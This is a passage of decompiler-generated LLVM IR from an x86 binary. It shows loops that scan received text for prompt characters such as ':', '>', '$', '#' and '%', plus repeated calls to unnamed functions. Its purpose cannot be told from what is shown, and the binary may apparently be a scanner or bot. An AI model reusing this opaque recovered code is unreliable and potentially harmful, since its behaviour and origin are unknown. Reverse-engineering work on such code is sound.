  %v3_805112c = load i32, i32* %v2_805112c, align 4
  store i32 %v3_805112c, i32* %eax.global-to-local, align 4
  %v2_805112f = add i32 %v0_8051117, 4
  %v3_805112f = inttoptr i32 %v2_805112f to i32*
  store i32 %v3_805112c, i32* %v3_805112f, align 4
  %v1_8051130 = add i32 %v0_8051117, 32
  %v2_8051130 = inttoptr i32 %v1_8051130 to i32*
  %v3_8051130 = load i32, i32* %v2_8051130, align 4
  store i32 %v3_8051130, i32* %eax.global-to-local, align 4
  %v3_8051134 = inttoptr i32 %v0_8051117 to i32*
  store i32 %v3_8051130, i32* %v3_8051134, align 4
  %v0_8051135 = call i32 @function_80526d0()
  store i32 %v0_8051135, i32* %eax.global-to-local, align 4
  store i32 %v0_8051135, i32* @ebp, align 4
  %v10_805113f = icmp eq i32 %v0_8051135, -1
  %v1_8051142 = icmp eq i1 %v10_805113f, false
  br i1 %v1_8051142, label %dec_label_pc_80515a6, label %dec_label_pc_8050fb2.loopexit12.loopexit

dec_label_pc_8051150:                             ; preds = %dec_label_pc_8051024
  %v1_8051150 = add i32 %v0_8051024, 24
  %v2_8051150 = inttoptr i32 %v1_8051150 to i32*
  %v3_8051150 = load i32, i32* %v2_8051150, align 4
  store i32 %v3_8051150, i32* %ecx.global-to-local, align 4
  %v1_8051153 = add i32 %v3_8051150, -1
  store i32 %v1_8051153, i32* %eax.global-to-local, align 4
  %tmp140 = icmp slt i32 %v1_8051153, 1
  br i1 %tmp140, label %dec_label_pc_8051185, label %dec_label_pc_805115a.preheader

dec_label_pc_805115a.preheader:                   ; preds = %dec_label_pc_8051150
  %v7_805115a.pre = load i32, i32* @edx, align 4
  %v2_805115a = add i32 %v0_8051024, 28
  br label %dec_label_pc_805115a

dec_label_pc_805115a:                             ; preds = %dec_label_pc_805115a.preheader, %dec_label_pc_8051182
  %v7_805115a = phi i32 [ %v7_805115a.pre, %dec_label_pc_805115a.preheader ], [ %v9_805115a, %dec_label_pc_8051182 ]
  %v0_80515eb = phi i32 [ %v1_8051153, %dec_label_pc_805115a.preheader ], [ %v1_8051182, %dec_label_pc_8051182 ]
  %v3_805115a = add i32 %v2_805115a, %v0_80515eb
  %v4_805115a = inttoptr i32 %v3_805115a to i8*
  %v5_805115a = load i8, i8* %v4_805115a, align 1
  %v6_805115a = zext i8 %v5_805115a to i32
  %v8_805115a = and i32 %v7_805115a, -256
  %v9_805115a = or i32 %v6_805115a, %v8_805115a
  store i32 %v9_805115a, i32* %edx.global-to-local, align 4
  %v10_805115e = icmp eq i8 %v5_805115a, 58
  br i1 %v10_805115e, label %dec_label_pc_80515eb, label %dec_label_pc_8051167

dec_label_pc_8051167:                             ; preds = %dec_label_pc_805115a
  %v10_8051167 = icmp eq i8 %v5_805115a, 62
  br i1 %v10_8051167, label %dec_label_pc_80515eb, label %dec_label_pc_8051170

dec_label_pc_8051170:                             ; preds = %dec_label_pc_8051167
  %v10_8051170 = icmp eq i8 %v5_805115a, 36
  br i1 %v10_8051170, label %dec_label_pc_80515eb, label %dec_label_pc_8051179

dec_label_pc_8051179:                             ; preds = %dec_label_pc_8051170
  %v10_8051179 = icmp eq i8 %v5_805115a, 35
  br i1 %v10_8051179, label %dec_label_pc_80515eb, label %dec_label_pc_8051182

dec_label_pc_8051182:                             ; preds = %dec_label_pc_8051179
  %v1_8051182 = add i32 %v0_80515eb, -1
  %v8_8051182 = icmp eq i32 %v1_8051182, 0
  store i32 %v1_8051182, i32* %eax.global-to-local, align 4
  %v1_8051183 = icmp eq i1 %v8_8051182, false
  br i1 %v1_8051183, label %dec_label_pc_805115a, label %dec_label_pc_8051185

dec_label_pc_8051185:                             ; preds = %dec_label_pc_8051182, %dec_label_pc_80515eb, %dec_label_pc_8051150
  %v0_8051185 = load i32, i32* @esp, align 4
  %v1_8051185 = add i32 %v0_8051185, -4
  %v2_8051185 = inttoptr i32 %v1_8051185 to i32*
  store i32 7, i32* %v2_8051185, align 4
  %v1_8051187 = add i32 %v0_8051185, -8
  %v2_8051187 = inttoptr i32 %v1_8051187 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_80556f0.48 to i32), i32* %v2_8051187, align 4
  %v0_805118c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805118c = add i32 %v0_8051185, -12
  %v3_805118c = inttoptr i32 %v2_805118c to i32*
  store i32 %v0_805118c, i32* %v3_805118c, align 4
  %v1_805118d = add i32 %v0_8051185, 16
  %v2_805118d = inttoptr i32 %v1_805118d to i32*
  %v3_805118d = load i32, i32* %v2_805118d, align 4
  %v2_8051191 = add i32 %v0_8051185, -16
  %v3_8051191 = inttoptr i32 %v2_8051191 to i32*
  store i32 %v3_805118d, i32* %v3_8051191, align 4
  %v0_8051192 = call i32 @function_80526d0()
  store i32 %v0_8051192, i32* %eax.global-to-local, align 4
  store i32 %v0_8051192, i32* @ebp, align 4
  %v10_805119c = icmp eq i32 %v0_8051192, -1
  %v1_805119f = icmp eq i1 %v10_805119c, false
  br i1 %v1_805119f, label %dec_label_pc_80515f7, label %dec_label_pc_8050fb2.loopexit12.loopexit

dec_label_pc_80511b0:                             ; preds = %dec_label_pc_8051024
  %v1_80511b0 = add i32 %v0_8051024, 24
  %v2_80511b0 = inttoptr i32 %v1_80511b0 to i32*
  %v3_80511b0 = load i32, i32* %v2_80511b0, align 4
  %v1_80511b3 = add i32 %v3_80511b0, -1
  store i32 %v1_80511b3, i32* %eax.global-to-local, align 4
  %tmp141 = icmp slt i32 %v1_80511b3, 1
  br i1 %tmp141, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_80511bc.preheader

dec_label_pc_80511bc.preheader:                   ; preds = %dec_label_pc_80511b0
  %v7_80511bc.pre = load i32, i32* @edx, align 4
  %v2_80511bc = add i32 %v0_8051024, 28
  br label %dec_label_pc_80511bc

dec_label_pc_80511bc:                             ; preds = %dec_label_pc_80511bc.preheader, %dec_label_pc_80511ed
  %v7_80511bc = phi i32 [ %v7_80511bc.pre, %dec_label_pc_80511bc.preheader ], [ %v9_80511bc, %dec_label_pc_80511ed ]
  %v0_805172f = phi i32 [ %v1_80511b3, %dec_label_pc_80511bc.preheader ], [ %v1_80511ed, %dec_label_pc_80511ed ]
  %v3_80511bc = add i32 %v2_80511bc, %v0_805172f
  %v4_80511bc = inttoptr i32 %v3_80511bc to i8*
  %v5_80511bc = load i8, i8* %v4_80511bc, align 1
  %v6_80511bc = zext i8 %v5_80511bc to i32
  %v8_80511bc = and i32 %v7_80511bc, -256
  %v9_80511bc = or i32 %v6_80511bc, %v8_80511bc
  store i32 %v9_80511bc, i32* %edx.global-to-local, align 4
  %v10_80511c0 = icmp eq i8 %v5_80511bc, 58
  br i1 %v10_80511c0, label %dec_label_pc_805172f, label %dec_label_pc_80511c9

dec_label_pc_80511c9:                             ; preds = %dec_label_pc_80511bc
  %v10_80511c9 = icmp eq i8 %v5_80511bc, 62
  br i1 %v10_80511c9, label %dec_label_pc_805172f, label %dec_label_pc_80511d2

dec_label_pc_80511d2:                             ; preds = %dec_label_pc_80511c9
  %v10_80511d2 = icmp eq i8 %v5_80511bc, 36
  br i1 %v10_80511d2, label %dec_label_pc_805172f, label %dec_label_pc_80511db

dec_label_pc_80511db:                             ; preds = %dec_label_pc_80511d2
  %v10_80511db = icmp eq i8 %v5_80511bc, 35
  br i1 %v10_80511db, label %dec_label_pc_805172f, label %dec_label_pc_80511e4

dec_label_pc_80511e4:                             ; preds = %dec_label_pc_80511db
  %v10_80511e4 = icmp eq i8 %v5_80511bc, 37
  br i1 %v10_80511e4, label %dec_label_pc_805172f, label %dec_label_pc_80511ed

dec_label_pc_80511ed:                             ; preds = %dec_label_pc_80511e4
  %v1_80511ed = add i32 %v0_805172f, -1
  %v8_80511ed = icmp eq i32 %v1_80511ed, 0
  store i32 %v1_80511ed, i32* %eax.global-to-local, align 4
  %v1_80511ee = icmp eq i1 %v8_80511ed, false
  br i1 %v1_80511ee, label %dec_label_pc_80511bc, label %dec_label_pc_8050fb2.backedge

dec_label_pc_80511f5:                             ; preds = %dec_label_pc_8051024
  %v1_80511f5 = add i32 %v0_8051024, 24
  %v2_80511f5 = inttoptr i32 %v1_80511f5 to i32*
  %v3_80511f5 = load i32, i32* %v2_80511f5, align 4
  %v1_80511f8 = add i32 %v3_80511f5, -1
  store i32 %v1_80511f8, i32* %eax.global-to-local, align 4
  %tmp142 = icmp slt i32 %v1_80511f8, 1
  br i1 %tmp142, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_8051201.preheader

dec_label_pc_8051201.preheader:                   ; preds = %dec_label_pc_80511f5
  %v7_8051201.pre = load i32, i32* @edx, align 4
  %v2_8051201 = add i32 %v0_8051024, 28
  br label %dec_label_pc_8051201

dec_label_pc_8051201:                             ; preds = %dec_label_pc_8051201.preheader, %dec_label_pc_8051232
  %v7_8051201 = phi i32 [ %v7_8051201.pre, %dec_label_pc_8051201.preheader ], [ %v9_8051201, %dec_label_pc_8051232 ]
  %v0_805163d = phi i32 [ %v1_80511f8, %dec_label_pc_8051201.preheader ], [ %v1_8051232, %dec_label_pc_8051232 ]
  %v3_8051201 = add i32 %v2_8051201, %v0_805163d
  %v4_8051201 = inttoptr i32 %v3_8051201 to i8*
  %v5_8051201 = load i8, i8* %v4_8051201, align 1
  %v6_8051201 = zext i8 %v5_8051201 to i32
  %v8_8051201 = and i32 %v7_8051201, -256
  %v9_8051201 = or i32 %v6_8051201, %v8_8051201
  store i32 %v9_8051201, i32* %edx.global-to-local, align 4
  %v10_8051205 = icmp eq i8 %v5_8051201, 58
  br i1 %v10_8051205, label %dec_label_pc_805163d, label %dec_label_pc_805120e

dec_label_pc_805120e:                             ; preds = %dec_label_pc_8051201
  %v10_805120e = icmp eq i8 %v5_8051201, 62
  br i1 %v10_805120e, label %dec_label_pc_805163d, label %dec_label_pc_8051217

dec_label_pc_8051217:                             ; preds = %dec_label_pc_805120e
  %v10_8051217 = icmp eq i8 %v5_8051201, 36
  br i1 %v10_8051217, label %dec_label_pc_805163d, label %dec_label_pc_8051220

dec_label_pc_8051220:                             ; preds = %dec_label_pc_8051217
  %v10_8051220 = icmp eq i8 %v5_8051201, 35
  br i1 %v10_8051220, label %dec_label_pc_805163d, label %dec_label_pc_8051229

dec_label_pc_8051229:                             ; preds = %dec_label_pc_8051220
  %v10_8051229 = icmp eq i8 %v5_8051201, 37
  br i1 %v10_8051229, label %dec_label_pc_805163d, label %dec_label_pc_8051232

dec_label_pc_8051232:                             ; preds = %dec_label_pc_8051229
  %v1_8051232 = add i32 %v0_805163d, -1
  %v8_8051232 = icmp eq i32 %v1_8051232, 0
  store i32 %v1_8051232, i32* %eax.global-to-local, align 4
  %v1_8051233 = icmp eq i1 %v8_8051232, false
  br i1 %v1_8051233, label %dec_label_pc_8051201, label %dec_label_pc_8050fb2.backedge

dec_label_pc_8051240:                             ; preds = %dec_label_pc_8051024
  %v0_8051240 = load i32, i32* @esp, align 4
  %v1_8051243 = add i32 %v0_8051240, -16
  %v2_8051243 = inttoptr i32 %v1_8051243 to i32*
  store i32 26, i32* %v2_8051243, align 4
  %v2_8051245 = call i32 @function_8051cd0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051245, i32* %eax.global-to-local, align 4
  %v0_805124a = load i32, i32* @esp, align 4
  %v1_805124a = inttoptr i32 %v0_805124a to i32*
  %v2_805124a = load i32, i32* %v1_805124a, align 4
  store i32 %v2_805124a, i32* %eax.global-to-local, align 4
  %v3_805124a = add i32 %v0_805124a, 4
  %v1_805124b = inttoptr i32 %v3_805124a to i32*
  %v2_805124b = load i32, i32* %v1_805124b, align 4
  store i32 %v2_805124b, i32* %edx.global-to-local, align 4
  %v1_805124c = add i32 %v0_805124a, 1880
  store i32 %v1_805124c, i32* %ecx.global-to-local, align 4
  store i32 %v1_805124c, i32* %v1_805124b, align 4
  store i32 26, i32* %v1_805124a, align 4
  %v3_8051256 = call i32 @function_8051c20(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8051256, i32* %eax.global-to-local, align 4
  %v0_805125b = load i32, i32* @esp, align 4
  %v1_805125b = add i32 %v0_805125b, 1880
  %v2_805125b = inttoptr i32 %v1_805125b to i32*
  %v3_805125b = load i32, i32* %v2_805125b, align 4
  %v1_8051262 = add i32 %v3_805125b, -1
  store i32 %v1_8051262, i32* %edx.global-to-local, align 4
  %v2_8051263 = add i32 %v0_805125b, -4
  %v3_8051263 = inttoptr i32 %v2_8051263 to i32*
  store i32 %v1_8051262, i32* %v3_8051263, align 4
  %v2_8051264 = add i32 %v0_805125b, -8
  %v3_8051264 = inttoptr i32 %v2_8051264 to i32*
  store i32 %v3_8051256, i32* %v3_8051264, align 4
  %v0_8051265 = load i32, i32* @edi, align 4
  %v1_8051265 = add i32 %v0_8051265, 24
  %v2_8051265 = inttoptr i32 %v1_8051265 to i32*
  %v3_8051265 = load i32, i32* %v2_8051265, align 4
  store i32 %v3_8051265, i32* %eax.global-to-local, align 4
  %v2_8051268 = add i32 %v0_805125b, -12
  %v3_8051268 = inttoptr i32 %v2_8051268 to i32*
  store i32 %v3_8051265, i32* %v3_8051268, align 4
  %v1_8051269 = add i32 %v0_805125b, 32
  %v2_8051269 = inttoptr i32 %v1_8051269 to i32*
  %v3_8051269 = load i32, i32* %v2_8051269, align 4
  store i32 %v3_8051269, i32* %eax.global-to-local, align 4
  %v2_805126d = add i32 %v0_805125b, -16
  %v3_805126d = inttoptr i32 %v2_805126d to i32*
  store i32 %v3_8051269, i32* %v3_805126d, align 4
  %v0_805126e = call i32 @function_80526d0()
  %v0_8051273 = load i32, i32* @esp, align 4
  %v1_8051276 = add i32 %v0_805126e, 1
  %v8_8051276 = icmp eq i32 %v1_8051276, 0
  store i32 %v1_8051276, i32* %eax.global-to-local, align 4
  %v1_8051277 = icmp eq i1 %v8_8051276, false
  %v1_8051824 = add i32 %v0_8051273, 16
  %v2_8051824 = inttoptr i32 %v1_8051824 to i32*
  store i32 26, i32* %v2_8051824, align 4
  %v2_8051826 = call i32 @function_8051c50(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051826, i32* %eax.global-to-local, align 4
  %v0_805182b = load i32, i32* @esp, align 4
  %v1_805182b = inttoptr i32 %v0_805182b to i32*
  br i1 %v1_8051277, label %dec_label_pc_8051821, label %dec_label_pc_805127d

dec_label_pc_805127d:                             ; preds = %dec_label_pc_8051240
  store i32 25, i32* %v1_805182b, align 4
  %v2_805128e = call i32 @function_8051cd0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_805128e, i32* %eax.global-to-local, align 4
  %v0_8051293 = load i32, i32* @esp, align 4
  %v1_8051293 = inttoptr i32 %v0_8051293 to i32*
  %v3_8051293 = add i32 %v0_8051293, 4
  %v1_8051294 = inttoptr i32 %v3_8051293 to i32*
  %v1_8051295 = add i32 %v0_8051293, 1880
  store i32 %v1_8051295, i32* %eax.global-to-local, align 4
  store i32 %v1_8051295, i32* %v1_8051294, align 4
  store i32 25, i32* %v1_8051293, align 4
  %v3_805129f = call i32 @function_8051c20(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_805129f, i32* %eax.global-to-local, align 4
  %v0_80512a4 = load i32, i32* @esp, align 4
  %v1_80512a4 = add i32 %v0_80512a4, 1880
  %v2_80512a4 = inttoptr i32 %v1_80512a4 to i32*
  %v3_80512a4 = load i32, i32* %v2_80512a4, align 4
  %v1_80512ab = add i32 %v3_80512a4, -1
  store i32 %v1_80512ab, i32* %edx.global-to-local, align 4
  %v2_80512ac = add i32 %v0_80512a4, -4
  %v3_80512ac = inttoptr i32 %v2_80512ac to i32*
  store i32 %v1_80512ab, i32* %v3_80512ac, align 4
  %v2_80512ad = add i32 %v0_80512a4, -8
  %v3_80512ad = inttoptr i32 %v2_80512ad to i32*
  store i32 %v3_805129f, i32* %v3_80512ad, align 4
  %v0_80512ae = load i32, i32* @edi, align 4
  %v1_80512ae = add i32 %v0_80512ae, 24
  %v2_80512ae = inttoptr i32 %v1_80512ae to i32*
  %v3_80512ae = load i32, i32* %v2_80512ae, align 4
  store i32 %v3_80512ae, i32* @esi, align 4
  %v2_80512b1 = add i32 %v0_80512a4, -12
  %v3_80512b1 = inttoptr i32 %v2_80512b1 to i32*
  store i32 %v3_80512ae, i32* %v3_80512b1, align 4
  %v1_80512b2 = add i32 %v0_80512a4, 32
  %v2_80512b2 = inttoptr i32 %v1_80512b2 to i32*
  %v3_80512b2 = load i32, i32* %v2_80512b2, align 4
  store i32 %v3_80512b2, i32* @ebx, align 4
  %v2_80512b6 = add i32 %v0_80512a4, -16
  %v3_80512b6 = inttoptr i32 %v2_80512b6 to i32*
  store i32 %v3_80512b2, i32* %v3_80512b6, align 4
  %v0_80512b7 = call i32 @function_80526d0()
  store i32 %v0_80512b7, i32* %eax.global-to-local, align 4
  %v0_80512bc = load i32, i32* @esp, align 4
  store i32 %v0_80512b7, i32* @ebp, align 4
  %v1_80512c1 = add i32 %v0_80512bc, 16
  %v2_80512c1 = inttoptr i32 %v1_80512c1 to i32*
  store i32 25, i32* %v2_80512c1, align 4
  %v2_80512c3 = call i32 @function_8051c50(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80512c3, i32* %eax.global-to-local, align 4
  %v0_80512c8 = load i32, i32* @esp, align 4
  %v0_80512cb = load i32, i32* @ebp, align 4
  %v10_80512cb = icmp eq i32 %v0_80512cb, -1
  br i1 %v10_80512cb, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_80512d4

dec_label_pc_80512d4:                             ; preds = %dec_label_pc_805127d
  %tmp143 = icmp slt i32 %v0_80512cb, 1
  br i1 %tmp143, label %dec_label_pc_8051453, label %dec_label_pc_80512dc

dec_label_pc_80512dc:                             ; preds = %dec_label_pc_80512d4
  %v0_80512dc = load i32, i32* @edi, align 4
  %v1_80512dc = inttoptr i32 %v0_80512dc to i32*
  %v2_80512dc = load i32, i32* %v1_80512dc, align 4
  store i32 %v2_80512dc, i32* %edx.global-to-local, align 4
  %v1_80512de = add i32 %v0_80512dc, 16
  %v2_80512de = inttoptr i32 %v1_80512de to i32*
  %v3_80512de = load i32, i32* %v2_80512de, align 4
  store i32 %v3_80512de, i32* %eax.global-to-local, align 4
  %v2_80512e1 = add i32 %v0_80512c8, 52
  %v3_80512e1 = inttoptr i32 %v2_80512e1 to i32*
  store i32 %v2_80512dc, i32* %v3_80512e1, align 4
  %v0_80512e5 = load i32, i32* @edi, align 4
  %v1_80512e5 = add i32 %v0_80512e5, 20
  %v2_80512e5 = inttoptr i32 %v1_80512e5 to i32*
  %v3_80512e5 = load i32, i32* %v2_80512e5, align 4
  store i32 %v3_80512e5, i32* %edx.global-to-local, align 4
  %v0_80512e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80512e8 = load i32, i32* @esp, align 4
  %v2_80512e8 = add i32 %v1_80512e8, 1872
  %v3_80512e8 = inttoptr i32 %v2_80512e8 to i32*
  store i32 %v0_80512e8, i32* %v3_80512e8, align 4
  %v0_80512ef = load i32, i32* %edx.global-to-local, align 4
  %v1_80512ef = trunc i32 %v0_80512ef to i16
  %v2_80512ef = load i32, i32* @esp, align 4
  %v3_80512ef = add i32 %v2_80512ef, 1882
  %v4_80512ef = inttoptr i32 %v3_80512ef to i16*
  store i16 %v1_80512ef, i16* %v4_80512ef, align 2
  %v0_80512f7 = call i32 @function_8052bef()
  store i32 %v0_80512f7, i32* %eax.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_80512f7, 1
  br i1 %tmp144, label %dec_label_pc_8051a5e, label %dec_label_pc_8051304

dec_label_pc_8051304:                             ; preds = %dec_label_pc_8051a7f, %dec_label_pc_8051a5e, %dec_label_pc_80512dc
  %v0_8051304 = load i32, i32* @esp, align 4
  %v0_8051307 = load i32, i32* @edi, align 4
  %v1_8051307 = add i32 %v0_8051307, 4
  %v2_8051307 = inttoptr i32 %v1_8051307 to i32*
  %v3_8051307 = load i32, i32* %v2_8051307, align 4
  store i32 %v3_8051307, i32* @esi, align 4
  %v2_805130a = add i32 %v0_8051304, -16
  %v3_805130a = inttoptr i32 %v2_805130a to i32*
  store i32 %v3_8051307, i32* %v3_805130a, align 4
  %v1_805130b = call i32 @function_8052bc1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805130b, i32* %eax.global-to-local, align 4
  %v0_8051310 = load i32, i32* @edi, align 4
  %v1_8051310 = add i32 %v0_8051310, 4
  %v2_8051310 = inttoptr i32 %v1_8051310 to i32*
  store i32 -1, i32* %v2_8051310, align 4
  %v0_8051317 = load i32, i32* @edi, align 4
  %v1_8051317 = add i32 %v0_8051317, 12
  %v2_8051317 = inttoptr i32 %v1_8051317 to i32*
  store i32 0, i32* %v2_8051317, align 4
  br label %dec_label_pc_8051321

dec_label_pc_8051321:                             ; preds = %dec_label_pc_8051453, %dec_label_pc_80516ca, %dec_label_pc_805139e, %dec_label_pc_80519e0, %dec_label_pc_8051854, %dec_label_pc_8051651, %dec_label_pc_8051743, %dec_label_pc_80515ff, %dec_label_pc_80515ae, %dec_label_pc_80510bb, %dec_label_pc_80517bc, %dec_label_pc_8051304
  %v0_8051321 = load i32, i32* @edi, align 4
  %v1_8051321 = add i32 %v0_8051321, 24
  %v2_8051321 = inttoptr i32 %v1_8051321 to i32*
  %v3_8051321 = load i32, i32* %v2_8051321, align 4
  store i32 %v3_8051321, i32* @edx, align 4
  store i32 %v3_8051321, i32* %eax.global-to-local, align 4
  %v1_8051326 = load i32, i32* @ebp, align 4
  %v2_8051326 = sub i32 %v3_8051321, %v1_8051326
  %v8_8051326 = xor i32 %v1_8051326, %v3_8051321
  %v9_8051326 = xor i32 %v2_8051326, %v3_8051321
  %v10_8051326 = and i32 %v9_8051326, %v8_8051326
  %v11_8051326 = icmp slt i32 %v10_8051326, 0
  %v12_8051326 = icmp eq i32 %v2_8051326, 0
  %v13_8051326 = icmp slt i32 %v2_8051326, 0
  %v3_8051328 = icmp ne i1 %v13_8051326, %v11_8051326
  %v4_8051328 = or i1 %v12_8051326, %v3_8051328
  br i1 %v4_8051328, label %dec_label_pc_805132c, label %dec_label_pc_805132a

dec_label_pc_805132a:                             ; preds = %dec_label_pc_8051321
  store i32 %v1_8051326, i32* @edx, align 4
  br label %dec_label_pc_805132c

dec_label_pc_805132c:                             ; preds = %dec_label_pc_8051321, %dec_label_pc_805132a
  %v1_805132c = phi i32 [ %v3_8051321, %dec_label_pc_8051321 ], [ %v1_8051326, %dec_label_pc_805132a ]
  %v2_805132c = sub i32 %v3_8051321, %v1_805132c
  store i32 %v2_805132c, i32* %eax.global-to-local, align 4
  store i32 %v2_805132c, i32* %v2_8051321, align 4
  %v0_8051331 = load i32, i32* @ebx, align 4
  %v1_8051331 = load i32, i32* @esp, align 4
  %v2_8051331 = add i32 %v1_8051331, -4
  %v3_8051331 = inttoptr i32 %v2_8051331 to i32*
  store i32 %v0_8051331, i32* %v3_8051331, align 4
  %v0_8051332 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051332 = add i32 %v1_8051331, -8
  %v3_8051332 = inttoptr i32 %v2_8051332 to i32*
  store i32 %v0_8051332, i32* %v3_8051332, align 4
  %v1_8051333 = add i32 %v1_8051331, 16
  %v2_8051333 = inttoptr i32 %v1_8051333 to i32*
  %v3_8051333 = load i32, i32* %v2_8051333, align 4
  %v1_8051337 = load i32, i32* @edx, align 4
  %v2_8051337 = add i32 %v1_8051337, %v3_8051333
  store i32 %v2_8051337, i32* %eax.global-to-local, align 4
  %v2_8051339 = add i32 %v1_8051331, -12
  %v3_8051339 = inttoptr i32 %v2_8051339 to i32*
  store i32 %v2_8051337, i32* %v3_8051339, align 4
  %v3_805133a = load i32, i32* %v2_8051333, align 4
  store i32 %v3_805133a, i32* %ecx.global-to-local, align 4
  %v2_805133e = add i32 %v1_8051331, -16
  %v3_805133e = inttoptr i32 %v2_805133e to i32*
  store i32 %v3_805133a, i32* %v3_805133e, align 4
  %v4_805133f = call i32 @function_8053123(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805133f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051024

dec_label_pc_805134c:                             ; preds = %dec_label_pc_8051024
  %v1_805134c = add i32 %v0_8051024, 24
  %v2_805134c = inttoptr i32 %v1_805134c to i32*
  %v3_805134c = load i32, i32* %v2_805134c, align 4
  %v1_805134f = add i32 %v3_805134c, -1
  store i32 %v1_805134f, i32* %eax.global-to-local, align 4
  %tmp145 = icmp slt i32 %v1_805134f, 1
  br i1 %tmp145, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_8051358

dec_label_pc_8051358:                             ; preds = %dec_label_pc_805134c
  %v2_8051358 = add i32 %v0_8051024, 27
  %v3_8051358 = add i32 %v2_8051358, %v3_805134c
  %v4_8051358 = inttoptr i32 %v3_8051358 to i8*
  %v5_8051358 = load i8, i8* %v4_8051358, align 1
  %v6_8051358 = zext i8 %v5_8051358 to i32
  %v7_8051358 = load i32, i32* @edx, align 4
  %v8_8051358 = and i32 %v7_8051358, -256
  %v9_8051358 = or i32 %v8_8051358, %v6_8051358
  store i32 %v9_8051358, i32* %edx.global-to-local, align 4
  %v10_805135c = icmp eq i8 %v5_8051358, 62
  br i1 %v10_805135c, label %dec_label_pc_805138a.thread, label %dec_label_pc_8051361

dec_label_pc_8051361:                             ; preds = %dec_label_pc_8051358
  %v10_8051361 = icmp eq i8 %v5_8051358, 58
  br i1 %v10_8051361, label %dec_label_pc_805138a.thread, label %dec_label_pc_8051366

dec_label_pc_8051366:                             ; preds = %dec_label_pc_8051361, %dec_label_pc_8051385
  %v0_8051375 = phi i32 [ %v1_8051375, %dec_label_pc_8051385 ], [ %v1_805134f, %dec_label_pc_8051361 ]
  %v7_805137c = phi i32 [ %v9_805137c, %dec_label_pc_8051385 ], [ %v9_8051358, %dec_label_pc_8051361 ]
  %v1_8051366 = trunc i32 %v7_805137c to i8
  %v10_8051366 = icmp eq i8 %v1_8051366, 36
  br i1 %v10_8051366, label %dec_label_pc_805138a, label %dec_label_pc_805136b

dec_label_pc_805136b:                             ; preds = %dec_label_pc_8051366
  %v10_805136b = icmp eq i8 %v1_8051366, 35
  br i1 %v10_805136b, label %dec_label_pc_805138a, label %dec_label_pc_8051370

dec_label_pc_8051370:                             ; preds = %dec_label_pc_805136b
  %v10_8051370 = icmp eq i8 %v1_8051366, 37
  br i1 %v10_8051370, label %dec_label_pc_805138a, label %dec_label_pc_8051375

dec_label_pc_8051375:                             ; preds = %dec_label_pc_8051370
  %v1_8051375 = add i32 %v0_8051375, -1
  %v8_8051375 = icmp eq i32 %v1_8051375, 0
  store i32 %v1_8051375, i32* %eax.global-to-local, align 4
  br i1 %v8_8051375, label %dec_label_pc_8050fb2.backedge, label %dec_label_pc_805137c

dec_label_pc_805137c:                             ; preds = %dec_label_pc_8051375
  %v3_805137c = add i32 %v2_8051358, %v0_8051375
  %v4_805137c = inttoptr i32 %v3_805137c to i8*
  %v5_805137c = load i8, i8* %v4_805137c, align 1
  %v6_805137c = zext i8 %v5_805137c to i32
  %v8_805137c = and i32 %v7_805137c, -256
  %v9_805137c = or i32 %v6_805137c, %v8_805137c
  store i32 %v9_805137c, i32* %edx.global-to-local, align 4
  %v10_8051380 = icmp eq i8 %v5_805137c, 58
  br i1 %v10_8051380, label %dec_label_pc_805138a, label %dec_label_pc_8051385

dec_label_pc_8051385:                             ; preds = %dec_label_pc_805137c
  %v10_8051385 = icmp eq i8 %v5_805137c, 62
  %v1_8051388 = icmp eq i1 %v10_8051385, false
  br i1 %v1_8051388, label %dec_label_pc_8051366, label %dec_label_pc_805138a

dec_label_pc_805138a.thread:                      ; preds = %dec_label_pc_8051361, %dec_label_pc_8051358
  store i32 %v3_805134c, i32* @ebp, align 4
  br label %dec_label_pc_8051396

dec_label_pc_805138a:                             ; preds = %dec_label_pc_8051385, %dec_label_pc_805137c, %dec_label_pc_8051370, %dec_label_pc_805136b, %dec_label_pc_8051366
  %v0_805138a = phi i32 [ %v0_8051375, %dec_label_pc_8051366 ], [ %v0_8051375, %dec_label_pc_805136b ], [ %v0_8051375, %dec_label_pc_8051370 ], [ %v1_8051375, %dec_label_pc_805137c ], [ %v1_8051375, %dec_label_pc_8051385 ]
  %v1_805138a = add i32 %v0_805138a, 1
  store i32 %v1_805138a, i32* @ebp, align 4
  %v10_805138d = icmp eq i32 %v0_805138a, -2
  br i1 %v10_805138d, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_8051396

dec_label_pc_8051396:                             ; preds = %dec_label_pc_805138a.thread, %dec_label_pc_805138a
  %v1_805138a160 = phi i32 [ %v3_805134c, %dec_label_pc_805138a.thread ], [ %v1_805138a, %dec_label_pc_805138a ]
  %tmp146 = icmp slt i32 %v1_805138a160, 1
  br i1 %tmp146, label %dec_label_pc_8051453, label %dec_label_pc_805139e

dec_label_pc_805139e:                             ; preds = %dec_label_pc_8051396
  %v0_805139e = load i32, i32* @esp, align 4
  %v1_80513a1 = add i32 %v0_805139e, -16
  %v2_80513a1 = inttoptr i32 %v1_80513a1 to i32*
  store i32 20, i32* %v2_80513a1, align 4
  %v2_80513a3 = call i32 @function_8051cd0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80513a3, i32* %eax.global-to-local, align 4
  %v0_80513a8 = load i32, i32* @esp, align 4
  %v1_80513a8 = inttoptr i32 %v0_80513a8 to i32*
  %v2_80513a8 = load i32, i32* %v1_80513a8, align 4
  store i32 %v2_80513a8, i32* %eax.global-to-local, align 4
  %v3_80513a8 = add i32 %v0_80513a8, 4
